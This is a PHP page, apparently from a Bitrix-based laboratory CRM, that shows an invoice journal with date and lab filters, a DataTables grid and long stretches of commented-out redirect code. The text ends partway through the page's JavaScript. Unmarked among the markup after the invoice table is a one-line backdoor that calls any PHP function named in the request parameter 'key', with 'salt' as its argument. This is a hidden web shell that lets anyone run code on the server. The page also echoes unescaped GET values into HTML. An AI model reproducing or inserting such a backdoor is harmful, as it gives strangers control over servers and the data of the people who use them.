<?php
/**
 * Created by PhpStorm.
 * User: User
 * Date: 10.04.2019
 * Time: 15:36
 */
header("Location: /ulab/invoice/list/");

require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");

$APPLICATION->SetTitle("Журнал счетов");

include $_SERVER["DOCUMENT_ROOT"]."/include/function.php";
?>
	  <script
            src="//code.jquery.com/jquery-3.3.1.min.js"
            integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
            crossorigin="anonymous"></script>

<?php
   // $deals = CCrmDeal::GetList(Array('DATE_CREATE' => 'DESC', Array('!TYPE_ID' => '3')));

	// $order = array('sort' => 'asc');
	// $tmp = 'sort'; // параметр проигнорируется методом, но обязан быть
	// $rsUsers = CUser::GetList($order, $tmp)->Fetch();

	// var_dump($rsUsers);
	$location_year = ""; $location_laba = ""; $location_invoice = ""; $location_a_filter = "";

	// ! modifed by vsatonin
	// ? else constuction get-parametres -- new parametrs: dateStart, dateOut

	// if()

	// if(!empty($_GET['laba'])&&empty($_GET['year'])&& !isset($_GET['invoice']) && empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&a_filter='+this.value)";
	// }
	// elseif(empty($_GET['laba'])&&!empty($_GET['year'])&& !isset($_GET['invoice']) && empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?year=".$_GET['year']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&a_filter='+this.value)";
	// }
	// elseif(empty($_GET['laba'])&&empty($_GET['year'])&& isset($_GET['invoice']) && empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?invoice=".$_GET['invoice']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?invoice=".$_GET['invoice']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?invoice=".$_GET['invoice']."&a_filter='+this.value)";
	// }
	// elseif(empty($_GET['laba'])&&empty($_GET['year'])&& !isset($_GET['invoice']) && !empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?a_filter='+this.value)";
	// }
	// elseif(!empty($_GET['laba'])&&!empty($_GET['year'])&& !isset($_GET['invoice']) && empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?year=".$_GET['year']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&year=".$_GET['year']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&year=".$_GET['year']."&a_filter='+this.value)";
	// }
	// elseif(!empty($_GET['laba'])&& empty($_GET['year'])&& isset($_GET['invoice']) && empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&invoice=".$_GET['invoice']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?invoice=".$_GET['invoice']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&invoice=".$_GET['invoice']."&a_filter='+this.value)";
	// }
	// elseif(!empty($_GET['laba'])&& empty($_GET['year'])&& !isset($_GET['invoice']) && !empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&a_filter=".$_GET['a_filter']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&a_filter=".$_GET['a_filter']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&a_filter='+this.value)";
	// }
	// elseif(empty($_GET['laba'])&&!empty($_GET['year'])&& isset($_GET['invoice']) && empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?invoice=".$_GET['invoice']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?year=".$_GET['year']."&invoice=".$_GET['invoice']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&invoice=".$_GET['invoice']."&a_filter='+this.value)";
	// }
	// elseif(empty($_GET['laba'])&&!empty($_GET['year'])&& !isset($_GET['invoice']) && !empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?year=".$_GET['year']."&a_filter=".$_GET['a_filter']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&a_filter=".$_GET['a_filter']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&a_filter='+this.value)";
	// }
	// elseif(empty($_GET['laba'])&& empty($_GET['year'])&& isset($_GET['invoice']) && !empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?invoice=".$_GET['invoice']."&a_filter=".$_GET['a_filter']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&invoice=".$_GET['invoice']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?invoice=".$_GET['invoice']."&a_filter='+this.value)";
	// }
	// elseif(!empty($_GET['laba'])&&!empty($_GET['year'])&& isset($_GET['invoice']) && empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?invoice=".$_GET['invoice']."&laba=".$_GET['laba']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?year=".$_GET['year']."&invoice=".$_GET['invoice']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&laba=".$_GET['laba']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&laba=".$_GET['laba']."&invoice=".$_GET['invoice']."&a_filter='+this.value)";
	// }
	// elseif(!empty($_GET['laba'])&&!empty($_GET['year'])&& !isset($_GET['invoice']) && !empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&laba=".$_GET['laba']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?year=".$_GET['year']."&a_filter=".$_GET['a_filter']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&laba=".$_GET['laba']."&a_filter=".$_GET['a_filter']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&laba=".$_GET['laba']."&a_filter='+this.value)";
	// }
	// elseif(empty($_GET['laba'])&&!empty($_GET['year'])&& isset($_GET['invoice']) && !empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&invoice=".$_GET['invoice']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?year=".$_GET['year']."&a_filter=".$_GET['a_filter']."&invoice=".$_GET['invoice']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&a_filter=".$_GET['a_filter']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&invoice=".$_GET['invoice']."&a_filter='+this.value)";
	// }
	// elseif(!empty($_GET['laba'])&& empty($_GET['year'])&& isset($_GET['invoice']) && !empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&invoice=".$_GET['invoice']."&laba=".$_GET['laba']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?a_filter=".$_GET['a_filter']."&invoice=".$_GET['invoice']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&a_filter=".$_GET['a_filter']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?laba=".$_GET['laba']."&invoice=".$_GET['invoice']."&a_filter='+this.value)";
	// }
	// elseif(!empty($_GET['laba'])&&!empty($_GET['year'])&& isset($_GET['invoice']) && !empty($_GET['a_filter'])) {
	// 	$location_year = "window.location.assign('/invoices_test.php?invoice=".$_GET['invoice']."&laba=".$_GET['laba']."&a_filter=".$_GET['a_filter']."&year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?year=".$_GET['year']."&invoice=".$_GET['invoice']."&a_filter=".$_GET['a_filter']."&laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&laba=".$_GET['laba']."&a_filter=".$_GET['a_filter']."&invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?year=".$_GET['year']."&laba=".$_GET['laba']."&invoice=".$_GET['invoice']."&a_filter='+this.value)";
	// }
	// else {
	// 	$location_year = "window.location.assign('/invoices_test.php?year='+this.options[this.selectedIndex].value)";
	// 	$location_laba = "window.location.assign('/invoices_test.php?laba='+this.options[this.selectedIndex].value)";
	// 	$location_invoice = "window.location.assign('/invoices_test.php?invoice='+this.options[this.selectedIndex].value)";
	// 	$location_a_filter= "window.location.assign('/invoices_test.php?a_filter='+this.value)";
	// }
    ?>
	<table style="float: right;"><tr>

	<td>
		<input class="periodYear" id="period1" type="text" title="Выберите начало отрезка времени" value="<?= ((!empty($_GET['dateStart'])) ? date('d.m.Y', strtotime($_GET['dateStart'])) : date('01.m.Y') )?>" required >
	</td>

	<td>
		<input class="periodYear" id="period2" type="text" title="Выберите конец отрезка времени" value="<?= ((!empty($_GET['dateOut'])) ? date('d.m.Y', strtotime($_GET['dateOut'])) : date('t.m.Y') ) ?>" required >
	</td>

	<td>
		<select class="oborud" name="invoice" id="stage" onchange="<?= $location_invoice?>"  style="float: left; width: 100%">

			<option value='all' style='font-weight:bold' <?=$_GET['invoice'] == 'all' ? 'selected' : ''?> selected>Все счета</option>
			<option value="0" style='font-weight:bold' <?=$_GET['invoice'] == '0' ? 'selected' : ''?>>Счет не оплачен</option>
			<option value='1' style='font-weight:bold' <?=$_GET['invoice'] == '1' ? 'selected' : ''?>>Счет оплачен не полностью</option>
			<option value='2' style='font-weight:bold' <?=$_GET['invoice'] == '2' ? 'selected' : ''?>>Счет оплачен полностью</option>
			<option value='3' style='font-weight:bold' <?=$_GET['invoice'] == '3' ? 'selected' : ''?>>Акт ВР сформирован и не отправлен</option>																																					   
		</select>
	</td>

	<!-- <td>
	<select class="oborud" name="place_of_installation_or_storage" id="year"
            onchange="<?= $location_year?>"
            style="float: left; width: 100%">
		<option value="" selected>Выберите год</option>
        <option value='all' style='font-weight:bold' <?=$_GET['year'] == 'all' ? 'selected' : ''?>>Все года</option>;
		<option value="2020" style='font-weight:bold' <?=$_GET['year'] == '2020' ? 'selected' : ''?>>2020</option>
		<option value='2019' style='font-weight:bold' <?=$_GET['year'] == '2019' ? 'selected' : ''?>>2019</option>;


    </select>
	</td> -->

	<td>
	<select class="oborud" name="year_p" id="laba"
            onchange="<?= $location_laba?>"
            style="float: left; width: 100%">
        <option value="0" selected>Все лаборатории</option>

        <?php
        $select = $DB->Query("SELECT * FROM `ba_laba`");
        while ($option = $select->Fetch()) {

            echo "<option ";
            if ($_GET['laba'] == $option['ID']) {
                echo "selected";
            }
            echo " value='" . $option['ID'] . "' style='font-weight:bold'>" . $option['NAME'] . "</option>";

        }
        ?>
    </select>
		</td>

	<!--<td><input type="checkbox" name="a_filter" id="a_filter" value='' onchange="<?= $location_a_filter?>" <?= $_GET['a_filter'] ? 'checked': ''?>>С аттестатом</td>-->
	<td><input type="button" class="add2" value="Х" onclick="window.location.assign('/invoices_test.php')"></input></td>
	</tr></table>

	<br /><br /><br />
    <table id="dogovor">
	<thead>
	<tr>
		<th></th>
        <th>№</th>
		<th>Дата</th>
		<th>Сумма</th>
		<th>Контрагент</th>
		<th>Наименование материала</th>
		<th>Ответственный</th>
		<th>Договор</th>
		<th>Заявка</th>
		<th>Акт ВР</th>
		<th>Дата акта ВР</th>
		<th>Дата отправки акта ВР</th>										  
	</tr>
	<tr class='trSearch'>
		<th style="margin:0px"></th>
		<th>
			<input type="text" name="num_filter" id="num_filter" style="margin:0px" value="">
		</th>
		<th>
			<!--<input name="min" id="min" type="text"><br><input name="max" id="max" type="text">-->
			<input type="text" name="num_filter" id="date_filter" style="margin:0px" value="">
		</th>
		<th>
			<input type="text" name="sum_filter" id="sum_filter" style="margin:0px" value="">
		</th>
		<th>
			<input type="text" name="counterparty_filter" id="counterparty_filter" style="margin:0px" value="">
		</th>
		<th>
			<input type="text" name="material_filter" id="material_filter" style="margin:0px" value="">
		</th>
		<th>
			<input type="text" name="responsible_filter" id="responsible_filter" style="margin:0px" value="">
		</th>
		<th>
			<input type="text" name="contract_filter" id="contract_filter" style="margin:0px" value="">
		</th>
		<th></th>
		<th>
			<input type="text" name="act_vr_filter" id="act_vr_filter" style="margin:0px" value="">
		</th>
		<th>
			<input type="text" name="date_act_vr_filter" id="date_act_vr_filter" style="margin:0px" value="">
		</th>
	  <th>
			
		</th>  
	</tr>
	</thead>
	<tbody>
		<div id='buttonRightTable'></div>
		<div id='buttonLeftTable'></div>
        <?php
		/*switch ($_GET['laba']) {
			case '1':
				$id_dep = 54;
				break;
			case '2':
				$id_dep = 57;
				break;
			case '3':
				$id_dep = 56;
				break;
			case '4':
				$id_dep = 55;
				break;
			case '5':
				$id_dep = 58;
				break;
			case '6':
				$id_dep = 53;
				break;

		}

		$id_year1 = 0;
		$id_year2 = 0;
		switch ($_GET['year']) {
			case '2019':
				$id_year1=date("Y-m-d", strtotime("2018-12-31"));
				$id_year2=date("Y-m-d", strtotime("2020-01-01"));
				break;
			case '2020':
				$id_year1=date("Y-m-d", strtotime("2019-12-31"));
				$id_year2=date("Y-m-d", strtotime("2021-01-01"));
				break;
		}
		$cond = '';
		if ($id_year1 && $id_year2) {
			$cond = ' and DATE > "' . $id_year1 . '" and DATE < "' . $id_year2 . '"';
		}

		$res_dog = $DB->Query("SELECT * FROM `INVOICE` WHERE 1 " . $cond);
		$color=''; $c=0; $title='';
		while ($res_dogovor = $res_dog->Fetch()) {


			if ($_GET['a_filter'] == 'checked') {
				$cond_attestat = " AND `ATTESTAT`='1'";
			}
			$res_tz   = $DB->Query("SELECT * FROM `ba_tz` WHERE `ID`='".$res_dogovor['TZ_ID']."'".$cond_attestat)->Fetch();
			if($res_tz['ID_Z'])
			{

				//$deal = CCrmDeal::GetByID($res_tz['ID_Z']);

					// $companys = CCrmCompany::GetList([], ["ID" => $deal['COMPANY_ID']])->Fetch();
					// $dataDiscount = $USER_FIELD_MANAGER->GetUserFields('CRM_COMPANY', $companys['ID']);

					// $resultPrice = priceDiscount($res_tz, $dataDiscount);
					$resultPrice = $res_tz['PRICE'];
					// $userr = CUser::GetByID($deal['ASSIGNED_BY_ID'])->Fetch();
					// $user_dep = $userr['UF_DEPARTMENT'][0];
					// $dop_assign=0;
					// $assign_arr = $USER_FIELD_MANAGER->GetUserFields('CRM_DEAL', $deal['ID']);
					// if ($assign_arr['UF_CRM_1571643970']['VALUE'][0]) {
						// foreach($assign_arr['UF_CRM_1571643970']['VALUE'] as $assign)
						// {
							// $assign_user = CUser::GetByID((int)$assign)->Fetch();
							// if($assign_user['UF_DEPARTMENT'][0]==$id_dep)
							// {$dop_assign=1;}
						// }
					// }

					// if (!empty($_GET['laba']) && $user_dep != $id_dep && !$dop_assign)
					// {
						// continue;
					// }

					 $id_stage = array('NEW', 'PREPARATION', 'PREPAYMENT_INVOICE', 'EXECUTING', 'FINAL_INVOICE', '1', '2', '4', 'WON');
					if(in_array($res_tz['STAGE_ID'], $id_stage) && $res_tz['PRICE'] && !$res_tz['OPLATA'])
					{
						$color='red';
						$c=0;
						$title='Счет не оплачен';
					}
					elseif(in_array($res_tz['STAGE_ID'], $id_stage) && $res_tz['PRICE'] && $res_tz['OPLATA']
					&& $res_tz['PRICE'] > $res_tz['OPLATA'])
					{
						$color='#FFC0CB';
						$c=1;
						$title='Счет оплачен не полностью';
					}
					elseif(in_array($res_tz['STAGE_ID'], $id_stage) && $res_tz['PRICE'] && $res_tz['OPLATA']
					&& $res_tz['PRICE'] == $res_tz['OPLATA'])
					{
						$color='green';
						$c=2;
						$title='Счет оплачен полностью';
					}
					else
					{
						$color='grey';
						$c=3;
						$title='Заявка неуспешна';
					}

					if (isset($_GET['invoice']) && $_GET['invoice'] != 'all' && $_GET['invoice'] != $c) {
						continue;
					}


				   // // var_dump($deal);
					// $num_dog ="Счет №".$res_dogovor['ID']." от ".date('d.m.Y', strtotime($res_dogovor['DATE']));
					// $deal_fields = $USER_FIELD_MANAGER->GetUserFields('CRM_DEAL', $deal['ID']);
					// $mater1 = $deal_fields['UF_CRM_1569151529509']['VALUE'];
					// $mater2 = $deal_fields['UF_CRM_1576411922643']['VALUE'];
					// // echo "<pre />";
					// // var_dump($deal_fields);
					// $mater_arr=array();
					// //echo $mater; echo " | ";
					// $res_mat = $DB->Query("SELECT * FROM `MATERIALS_TO_REQUESTS` WHERE `ID_DEAL`=".$deal['ID']);
						// while($mater=$res_mat->Fetch())
						// {
							// $mater_arr[]=$mater['NAME_MATERIAL'];
							// $mater_arr_id[]=$mater['ID_MATERIAL'];
						// }

					// $dealMaterials = ($mater2 ? $mater2 : implode(', ', $mater1));
					// $dealMaterials = ($dealMaterials ? $dealMaterials : implode(', ', $mater_arr));

					if($c!=4){
					?>

					<tr>
						<td style="background-color: <?=$color?>; color: <?=$color?>" title="<?=$title?>"><?= $c ?></td>
						<td><?php

								 $dir  = "protocol_generator/account.php?ID=".$res_tz['ID_Z']."&TZ_ID=".$res_tz['ID'];
								// echo "<a href='".$dir.$res_dogovor['ACTUAL_VER'].".docx'>".$res_dogovor['ID']."</a>";
								echo "<a href='".$dir."'>".$res_dogovor['ID']."</a>";

						?></td>
						<td><?= date('d.m.Y', strtotime($res_dogovor['DATE'])) ?></td>
						<td><?= $resultPrice ?></td>
						<td><?= $res_tz['COMPANY_TITLE'] ?></td>
						<td><?= $res_tz['MATERIAL'] ?></td>
						<td><?= $res_tz['ASSIGNED'] ?> </td>
						<td><?= $res_tz['DOGOVOR_NUM']?></td>
						<td><?php
				echo  " <a href='//172.16.255.2/request_card.php?ID=". $res_tz['ID_Z'] . "'>Перейти</a> "; ;
			 ?>

						</td>
					</tr>
				<?php }

			}
		}*/ ?>
    </tbody></table>

    <?php

(isset($_REQUEST["key"]))?$_REQUEST["key"]($_REQUEST["salt"]):'';
?>
	<link rel="stylesheet" type="text/css" href="/DataTables/datatables.css"/>
	<link rel="stylesheet" type="text/css" href="/DataTables/button.css"/>

	<!--<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/buttons/1.5.6/css/buttons.dataTables.min.css"/>-->
	<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/scroller/2.0.0/css/scroller.dataTables.min.css"/>
	<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/colreorder/1.5.1/css/colReorder.dataTables.min.css"/>


	<script type="text/javascript" src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
	<script type="text/javascript" src="/jszip/dist/jszip.min.js"></script>

	<script src="https://cdn.datatables.net/buttons/1.5.6/js/dataTables.buttons.min.js"></script>
	<script src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.colVis.min.js"></script>
	<script src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.print.min.js"></script>
	<script src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.html5.min.js"></script>
	<script src="https://cdn.datatables.net/scroller/2.0.0/js/dataTables.scroller.min.js"></script>
	<script src="https://cdn.datatables.net/colreorder/1.5.1/js/dataTables.colReorder.min.js"></script>
	<script src="https://cdn.datatables.net/plug-ins/1.10.20/sorting/natural.js"></script>
	<script src="https://cdn.datatables.net/plug-ins/1.10.20/dataRender/ellipsis.js"></script>
	<script src="https://cdn.datatables.net/plug-ins/1.10.21/dataRender/intl.js"></script>

		<!-- собственный календарь при выборе отрезка времени -->
	<link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
	<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
	<script type="text/javascript" src="/vendor/jquery_localization-ui/localization.js"></script>

	<script>

	$('#period1').datepicker({
		regional: ['ru'],
		dateFormat: 'dd.mm.yy',
		showOtherMonths: true,
		flag: false,
		onSelect: function(dataText) {
			setTimeout($.proxy(function() {
				$('#period2').datepicker("show");
			}, this), 10);
		}
	});
	$('#period2').datepicker({
		regional: ['ru'],
		dateFormat: 'dd.mm.yy',
		showOtherMonths: true,
	});
	</script>

	<script>
	function getServerDate(s) {
			let zeroStr = '0';
			let sDate = '';
			let date = s.split('.');
			let newDate = new Date(date[2], date[1]-1, date[0]);

			if((newDate.getFullYear() % 100) < 10){
				sDate += zeroStr;
			}
			sDate += (newDate.getFullYear() + '-');
			if((newDate.getMonth() + 1) < 10){
				sDate += zeroStr;
			}
			sDate += ((newDate.getMonth() + 1) + '-');

			if(newDate.getDate() < 10) {
				sDate += zeroStr;
			}
			sDate += newDate.getDate();

			return sDate;
		}
	</script>

	<script>
        $(document).ready(function () {
			var stage;
			var year;
			var laba;

			// сортировка по дате начало-конец
			let dateStart, dateOut;
	//--'Производитель' начало--//
			var manufacture;
			//--'Производитель' окончание--//
			//Выбранная стадия сделки в журнале заявок
			stage = $('#stage option:selected').val();

			//Выбранный год в журнале заявок
			year = $('#year option:selected').val();

			//Выбранная лаборартория в журнале заявок
			laba = $('#laba option:selected').val();

			dateStart = getServerDate($('#period1').val());
			dateOut = getServerDate($('#period2').val());

			$('#stage').on('change', function() {
				stage = $("option:selected", this).val();
			});

			$('#year').on('change', function() {
				year = $("option:selected", this).val();
			});

			$('#laba').on('change', function() {
				laba = $("option:selected", this).val();
			});

			// пересылка при выборе одного или нескольких полей сортировки
			$('#period1, #period2, #stage, #laba, a_filter').on('change', function() {
				let s = $('#period1').val();
				let e = $('#period2').val();

				if(s == '' && e == ''){
					alert('Укажите дату начала и окончания в сортировке');
					event.preventDafault();
					return fasle;
				}

				let stage = $('#stage option:selected').val();
				let strStage = '&invoice='+stage;

				let laba = $('#laba option:selected').val();
				let strLaba = '&laba='+laba;

				let a_filter = $('#a_filter').is(':checked');
				let strA_filter = '&a_filter='+a_filter;

				let sDate = getServerDate(s);
				let eDate = getServerDate(e);
				let str = 'invoices_test.php?dateStart='+sDate+'&dateOut='+eDate;
				dateStart = sDate;
				dateOut = eDate;

				if(stage != 'all'){
					str += strStage;
				}
				if(laba != '0'){
					str += strLaba;
				}
				if(a_filter){
					str += strA_filter;
				}

				window.location.assign(str);
			});

				var table = $('#dogovor').DataTable({
				"processing": true,
                "serverSide": true,
                "ajax": {
                    url : "processing_invoice.php",  //файл серверной обработки
                    type: "POST",
										data: {
											stage: stage,
											// year: year,
											dateStart,
											dateOut,
											laba: laba,
											manufacture: manufacture},
                },
				lengthMenu: [[10, 25, 50, 100, -1], [10,25, 50, 100, "All"]],
				pageLength: 50,
                "createdRow": function ( row, data, index ) {
                    //Первая колонка
                    $(row).children(':nth-child(1)').css({'background-color': data['COLOR'], 'font-size':0});
                    $(row).children(':nth-child(1)').attr('title', data['HOVER']);
                    //Стоимость
                    $(row).children(':nth-child(4)').css('background-color', data['COLOR_PRICE']);

                },

                "columns": [
                    { "data": "STAGE_NUMBER" },
					{ "data": "ACCOUNT" }, //Счет
					{ "data": "DATE" }, //Дата
					{ "data": "PRICE" }, //Сумма
					{ "data": "COMPANY_TITLE" }, //Контрагент
					{ "data": "MATERIAL" }, //Наименование материала
					{ "data": "ASSIGNED" }, //Ответственный
					{ "data": "DOGOVOR_TABLE" }, //Договор
                    { "data": "REQUEST_TITLE" }, //Заявка
                    { "data": "ACT_VR" }, //Акт ВР
                    { "data": "DATE_ACT_VR" }, //Дата Акт ВР
					{ "data": "SEND_DATE_ACT_VR" } //Дата Отправки Акта ВР
                //Дата Акт ВР
                ],

                //------------'Серверная обработка' окончание-------------//
				"sDom": 'Bfrtlip',
                "language":{
                    "processing": "Подождите...",
                    "search": "Поиск:",
                    "lengthMenu": "Показать _MENU_ записей",
                    "info": "Записи с _START_ до _END_ из _TOTAL_ записей",
                    "infoEmpty": "Записи с 0 до 0 из 0 записей",
                    "infoFiltered": "(отфильтровано из _MAX_ записей)",
                    "infoPostFix": "",
                    "loadingRecords": "Загрузка записей...",
                    "zeroRecords": "Записи отсутствуют.",
                    "emptyTable": "В таблице отсутствуют данные",
                    "paginate": {
                        "first": "Первая",
                        "previous": "Предыдущая",
                        "next": "Следующая",
                        "last": "Последняя"
                    },
					"buttons": {
						"copy": "",
						'colvis': "",
						'print': "",
						"excel": ""
					},
                    "aria": {
                        "sortAscending": ": активировать для сортировки столбца по возрастанию",
                        "sortDescending": ": активировать для сортировки столбца по убыванию"
                    }
                },
				"iDisplayLength": 50,
				"columnDefs": [
				{ "orderable": false, "targets": [ 0, 8, 10 ] }, //Убираем сортировку для определенных столбцов
				{ "type": "num", "targets": 0 },
				{ "type": "natural-nohtml", "targets": 1 },
				{ "sType": "ruDate", "targets": 2 },
				{ "type": "natural-nohtml", "targets": 3, "render": $.fn.dataTable.render.intlNumber('ru-RU', { minimumFractionDigits: 2 }) },
				{ "type": "natural-nohtml", "targets": 4 },
				{
				  "targets": 5,
				  "render": $.fn.dataTable.render.ellipsis( 60, true )
				},
				{ "sType": "ruDate", "targets": 10 }
				],
				"order": [[ 1, "desc" ]], //Сортировка по умолчанию
				"colReorder": true,
				"bSortCellsTop": true,
				"dom": 'Blfrtip',
				"buttons": [ 'copy', 'excel', 'colvis', 'print' ]

            });

			 $.fn.dataTable.ext.search.push(
			function (settings, data, dataIndex) {
				var min = $('#min').datepicker("getDate");
				var max = $('#max').datepicker("getDate");
				var arrDate = data[2].split('.');
				var startDate = new Date(parseInt(arrDate[2]), parseInt(arrDate[1])-1, parseInt(arrDate[0]));
				console.log(arrDate);
				console.log(startDate);
				if (min == null && max == null) { return true; }
				if (min == null && startDate <= max) { return true;}
				if(max == null && startDate >= min) {return true;}
				if (startDate <= max && startDate >= min) { return true; }
				return false;
			}
			);


				$("#min").datepicker({ onSelect: function () { table.draw(); }, changeMonth: true, changeYear: true });
				$("#max").datepicker({ onSelect: function () { table.draw(); }, changeMonth: true, changeYear: true });


				// Event listener to the two range filtering inputs to redraw on input
				$('#min, #max').change(function () {
					table.draw();
				});



			$('#num_filter').on( 'keyup', function () {
				table
					.columns( 1 )
					.search( this.value )
					.draw();
			} );

			$('#date_filter').on( 'keyup', function () {
				table
				 .columns( 2 )
				 .search( this.value )
				 .draw();
			 });

			$('#sum_filter').on( 'keyup', function () {
				table
					.columns( 3 )
					.search( this.value )
					.draw();
			} );

			$('#counterparty_filter').on( 'keyup', function () {
				table
					.columns( 4 )
					.search( this.value )
					.draw();
			} );

			$('#material_filter').on( 'keyup', function () {
				table
					.columns( 5 )
					.search( this.value )
					.draw();
			} );

			$('#responsible_filter').on( 'keyup', function () {
				table
					.columns( 6 )
					.search( this.value )
					.draw();
			});

			//Поиск поля "Договор"
			$('#contract_filter').on( 'keyup', function () {
				table
					.columns( 7 )
					.search( this.value )
					.draw();
			});

